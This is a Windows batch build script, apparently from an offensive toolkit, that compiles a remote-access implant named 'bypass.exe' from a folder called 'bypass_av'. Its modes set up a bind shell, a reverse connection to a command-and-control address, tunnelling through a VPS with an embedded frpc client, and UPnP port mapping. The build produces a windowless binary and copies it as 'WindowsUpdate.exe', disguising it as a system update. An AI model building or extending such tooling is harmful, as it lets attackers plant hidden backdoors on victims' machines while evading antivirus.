@echo off
REM =================================================================
REM  build.bat  -  unified build dispatcher
REM -----------------------------------------------------------------
REM  Usage:
REM     build.bat                         plain bind-shell mode (port 54321)
REM     build.bat plain                   same as bare call
REM     build.bat frp   ^<vps_ip^> [vp] [rp]  embed frpc.exe, tunnel through VPS
REM     build.bat tunnel ^<tunnel_ip^> [rp]   active tunnel client (no VPS)
REM     build.bat upnp                    UPnP auto-portmap mode
REM     build.bat reverse ^<c2_ip^> ^<c2_port^>
REM                                       actively connect out to the listener
REM     build.bat sessionkey              plain + per-session key exchange
REM
REM  See HANDOVER.md or README.md for the architecture overview.
REM =================================================================

setlocal enabledelayedexpansion
cd /d "%~dp0"

REM -------------------------------------------------------------
REM  Local per-machine overrides (NOT committed to git).
REM  Create bypass_av\build.local.bat to point at a non-standard
REM  Visual Studio / toolchain location on this machine, e.g.:
REM      set "VS2022_DIR=C:\Custom\VS2022"
REM      set "FRPC_PATH=C:\Custom\frpc_upx.exe"
REM -------------------------------------------------------------
if exist "%~dp0build.local.bat" call "%~dp0build.local.bat"

set MODE=%~1
if "%MODE%"=="" set MODE=plain

echo ===================================================
echo   build.bat  mode=%MODE%
echo ===================================================

set "CFLAGS="
set "RESFLAGS="
set "LIBS=kernel32.lib user32.lib advapi32.lib ws2_32.lib"

if /i "%MODE%"=="plain" goto :pre_ok

if /i "%MODE%"=="frp" (
    set "VPS_IP=%2"
    set "VPS_PORT=%3"
    set "REMOTE_PORT=%4"
    if "!VPS_IP!"=="" (
        echo [!] build.bat frp ^<VPS_IP^> [vps_port] [remote_port]
        exit /b 1
    )
    if "!VPS_PORT!"=="" set VPS_PORT=7000
    if "!REMOTE_PORT!"=="" set REMOTE_PORT=4444
    if "%FRPC_PATH%"=="" (
        echo [!] FRPC_PATH not set.
        echo     Set it to the absolute path of your pre-compressed frpc_upx.exe, e.g.
        echo         set FRPC_PATH=C:\tools\frp\frpc_upx.exe
        echo     Or pass FRPC_PATH on the build command line.
        exit /b 1
    )
    if not exist "%FRPC_PATH%" (
        echo [!] frpc not found at %FRPC_PATH%
        echo     set FRPC_PATH=...  to override
        exit /b 1
    )
    echo [*] Embedding frpc + config for !VPS_IP!:!VPS_PORT! ...
    python tools\embed_frp.py "%FRPC_PATH%" !VPS_IP! !VPS_PORT! !REMOTE_PORT!
    if !errorlevel! neq 0 ( echo [!] embed_frp.py failed & exit /b 1 )
    set "CFLAGS=/DENABLE_FRP"
    goto :pre_ok
)

if /i "%MODE%"=="tunnel" (
    set "TUNNEL_IP=%2"
    set "REG_PORT=%3"
    if "!TUNNEL_IP!"=="" (
        echo [!] build.bat tunnel ^<tunnel_ip^> [reg_port]
        exit /b 1
    )
    if "!REG_PORT!"=="" set REG_PORT=5555
    echo [*] Generating tunnel_cfg.h for !TUNNEL_IP!:!REG_PORT! ...
    python tools\gen_tunnel_cfg.py !TUNNEL_IP! !REG_PORT!
    if !errorlevel! neq 0 ( echo [!] gen_tunnel_cfg.py failed & exit /b 1 )
    set "CFLAGS=/DTUNNEL_MODE"
    goto :pre_ok
)

if /i "%MODE%"=="upnp" (
    echo [*] Generating UPnP header ...
    python tools\gen_upnp.py > upnp_data.h
    if !errorlevel! neq 0 ( echo [!] gen_upnp.py failed & exit /b 1 )
    set "CFLAGS=/DENABLE_UPNP"
    set "LIBS=%LIBS% ole32.lib"
    goto :pre_ok
)

if /i "%MODE%"=="reverse" (
    set "REVERSE_IP=%2"
    set "REVERSE_PORT=%3"
    if "!REVERSE_IP!"=="" (
        echo [!] build.bat reverse ^<c2_ip^> ^<c2_port^>
        exit /b 1
    )
    if "!REVERSE_PORT!"=="" set REVERSE_PORT=4444
    echo [*] Generating reverse_cfg.h for !REVERSE_IP!:!REVERSE_PORT! ...
    python tools\gen_reverse_cfg.py !REVERSE_IP! !REVERSE_PORT!
    if !errorlevel! neq 0 ( echo [!] gen_reverse_cfg.py failed & exit /b 1 )
    set "CFLAGS=/DREVERSE_MODE /DENABLE_SESSION_KEY"
    goto :pre_ok
)

if /i "%MODE%"=="sessionkey" (
    set "CFLAGS=/DENABLE_SESSION_KEY"
    goto :pre_ok
)

echo [!] Unknown mode: %MODE%
echo     valid modes: plain ^| frp ^| tunnel ^| upnp ^| reverse
exit /b 1

:pre_ok
REM -------------------------------------------------------------
REM  find Visual Studio x64 toolchain
REM -------------------------------------------------------------
if defined VSCMD_VER goto :compile
echo [*] Locating Visual Studio x64 toolchain ...
for %%V in ("2022" "2019") do for %%E in (Community Professional Enterprise BuildTools) do (
    if exist "C:\Program Files\Microsoft Visual Studio\%%V\%%E\VC\Auxiliary\Build\vcvars64.bat" (
        call "C:\Program Files\Microsoft Visual Studio\%%V\%%E\VC\Auxiliary\Build\vcvars64.bat" >nul
        goto :compile
    )
    if exist "C:\Program Files (x86)\Microsoft Visual Studio\%%V\%%E\VC\Auxiliary\Build\vcvars64.bat" (
        call "C:\Program Files (x86)\Microsoft Visual Studio\%%V\%%E\VC\Auxiliary\Build\vcvars64.bat" >nul
        goto :compile
    )
)
set "VSWHERE=C:\Program Files (x86)\Microsoft Visual Studio\Installer\vswhere.exe"
if exist "!VSWHERE!" for /f "usebackq tokens=*" %%p in (`"!VSWHERE!" -latest -property installationPath`) do (
    if exist "%%p\VC\Auxiliary\Build\vcvars64.bat" (
        call "%%p\VC\Auxiliary\Build\vcvars64.bat" >nul
        goto :compile
    )
)
if exist "%VS2022_DIR%\VC\Auxiliary\Build\vcvars64.bat" (
    call "%VS2022_DIR%\VC\Auxiliary\Build\vcvars64.bat" >nul
    goto :compile
)
echo [!] Visual Studio x64 tools not found.
exit /b 1

:compile
echo [*] Compiling resources ...
rc /nologo byp.rc
if %errorlevel% neq 0 ( echo [!] Resource compile failed & exit /b 1 )

echo [*] Compiling main.c ...
cl /nologo /O1 /MT /GS- /GF %CFLAGS% main.c /link /NODEFAULTLIB %LIBS% ^
    byp.res /MACHINE:X64 /SUBSYSTEM:WINDOWS /ENTRY:WinMain /OUT:bypass.exe
if %errorlevel% neq 0 ( echo [!] Compile failed & exit /b 1 )

del /Q *.obj *.res 2>nul

for %%I in (bypass.exe) do echo [*] Done! bypass.exe (%%~zI bytes)
copy /Y bypass.exe WindowsUpdate.exe >nul
echo [*] Also copied as WindowsUpdate.exe
exit /b 0
